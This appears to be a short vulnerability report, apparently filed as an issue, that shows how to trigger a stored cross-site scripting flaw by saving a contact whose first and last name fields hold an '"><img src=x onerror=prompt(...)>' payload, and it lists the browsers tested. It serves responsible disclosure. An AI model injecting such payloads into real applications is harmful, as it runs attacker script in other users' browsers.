Hi,

Description :

Create a contact with

first name: test"><img src=x onerror=prompt('[@darknetguy](https://github.com/darknetguy)');>

and

last name : test2"><img src=x onerror=prompt('[@darknetguy](https://github.com/darknetguy)');>

Payload to use : "><img src=x onerror=prompt('[@darknetguy](https://github.com/darknetguy)');>

Tested on Windows 10 Firefox | Google Chrome // Cent-OS 7 Firefox | Chromium

Milad Fadavvi
